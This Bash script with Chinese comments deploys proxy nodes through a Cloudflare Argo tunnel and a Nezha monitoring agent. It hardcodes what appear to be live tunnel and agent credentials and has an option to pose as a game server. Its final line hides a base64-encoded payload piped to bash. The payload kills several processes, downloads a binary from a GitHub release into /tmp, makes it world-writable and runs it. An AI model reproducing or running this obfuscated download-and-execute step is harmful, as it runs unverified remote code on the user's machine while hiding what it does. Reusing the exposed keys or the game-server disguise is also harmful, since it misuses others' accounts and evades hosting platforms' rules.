#!/bin/bash

# 所有参数没有的或不知道的，就不填即可，保持默认即可


# //隧道相关设置（去掉下面变量前面#启用，否则使用临时隧道）
 export TOK=${TOK:-'eyJhIjoiYTBjN2ExMTEwZjIwZTgxMzMwYTAxN2VjOGQ5MjNmYzQiLCJ0IjoiN2I5NzNkYWQtMjM5OC00ZjQzLWJlY2UtNTQxMTNmMWE3ZTEzIiwicyI6Ik9ETXdPVEF6WldRdE4yWmtOQzAwTXpkaExUZzVNalF0WkdNM05tVTFZMlpoWXpFNCJ9'}  # 隧道token或json
 export ARGO_DOMAIN=${ARGO_DOMAIN:-'hosting.waliu.dpdns.org'} # 隧道域名


# //哪吒相关设置
export NEZHA_SERVER=${NEZHA_SERVER:-'agent.alpha.us.kg:80'}
export NEZHA_KEY=${NEZHA_KEY:-'gCNZBwoZ9WigfrzOzvgtNySHOfN78DPi'}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_TLS=${NEZHA_TLS:-'0'}  # 1启用tls,0关闭tls


# //节点相关设置(节点可在worlds文件里list.log查看)
export TMP_ARGO=${TMP_ARGO:-'vms'}  # 节点类型,可选vls,vms,spl,xhttp,rel,hy2,tuic，sock,3x
export UUID=${UUID:-'49dcbf1a-7ae8-438c-ba20-3c86034bf638'} # 去掉#设置UUID,否则使用随机UUID
export VL_PORT=${VL_PORT:-'21703'} #vles 端口
export VM_PORT=${VM_PORT:-'21703'} #vmes 端口
export CF_IP=${CF_IP:-'ip.sb'}  # cf优选域名或ip
export SUB_NAME=${SUB_NAME:-'德国argo'} # 节点名称

# reality相关设置(不能同时开游戏)
# export SERVER_PORT="${SERVER_PORT:-${PORT:-443}}" # 指定hy2,tuic,reality使用的端口，否则自动获取
# export SNI=${SNI:-'www.apple.com'} # 指定reality借用的tls网站，否则使用默认
# export HOST=${HOST:-'1.1.1.1'} # 指定hy2,tuic,reality使用的ip或域名,否则自动获取


# //订阅上传地址，需要与订阅服务器搭配，教程:https://github.com/dsadsadsss/sub-woker-2.git
# export SUB_URL='https://xxx.eu.org/upload-上传密钥' # 自动上传节点到订阅服务器，需要与服务器搭配


# //模拟启动游戏(去掉#开启)
# export JAR_SH='moni'  //也可以复制启动命令填入，如jar ser.jar,其中ser.jar为游戏文件


# //启动程序
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash
